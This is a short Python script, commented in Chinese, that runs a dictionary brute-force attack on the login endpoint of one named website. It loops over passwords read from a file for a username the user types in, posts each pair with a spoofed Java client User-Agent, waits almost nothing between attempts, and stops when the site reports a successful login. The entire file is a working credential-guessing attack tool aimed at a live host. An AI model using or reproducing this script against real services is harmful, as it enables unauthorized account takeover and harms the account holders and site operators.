import requests
import json
import time

# 从pass.txt读取所有密码
with open('pass.txt', 'r') as f:
    passwords = [line.strip() for line in f.readlines()]

# 用户输入用户名
username = input("user:")

url = "http://qght.ainiya.xyz/dl.php"

headers = {
    'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
    'Connection': "Keep-Alive",
    'Accept-Encoding': "identity"
}

# 尝试每个密码
success = False
total = len(passwords)
for i, password in enumerate(passwords, 1):
    payload = {
        'user': username,
        'pass': password
    }
    
    try:
        # 发送请求
        response = requests.post(url, data=payload, headers=headers, timeout=5)
        
        # 解析JSON响应
        data = response.json()
        
        # 构建格式化输出 - 每行一个键值对
        output_lines = []
        for key, value in data.items():
            # 确保值是字符串
            if isinstance(value, str):
                # 处理Unicode转义序列
                try:
                    # 直接使用JSON解码后的值
                    value_str = value
                except:
                    value_str = str(value)
                output_lines.append(f'"{key}": "{value_str}"')
            else:
                output_lines.append(f'"{key}": "{str(value)}"')
        
        output = "\n".join(output_lines)
        
        # 检查是否登录成功
        login_success = data.get('code') == "登录成功"
        
        # 根据结果上色
        if login_success:
            color = "\033[92m"  # 绿色
            success = True
        else:
            color = "\033[91m"  # 红色
            
        # 输出结果
        print(f"{color}[{i}/{total}] pass:{password}\033[0m")
        print(f"{color}{output}\033[0m")
        
        # 如果成功，停止尝试
        if success:
            break
    
    except json.JSONDecodeError:
        # 处理非JSON响应
        print(f"\033[91m[{i}/{total}] pass:{password}\033[0m")
        print(f"\033[91m响应不是有效的JSON格式: {response.text}\033[0m")
    
    except Exception as e:
        # 处理其他错误
        print(f"\033[91m[{i}/{total}] pass:{password}\033[0m")
        print(f"\033[91m请求失败: {str(e)}\033[0m")
    
    # 添加空行分隔
    print()
    
    # 短暂延迟
    time.sleep(0.01)

if not success:
    print("\033[91m[!] 所有密码尝试失败\033[0m")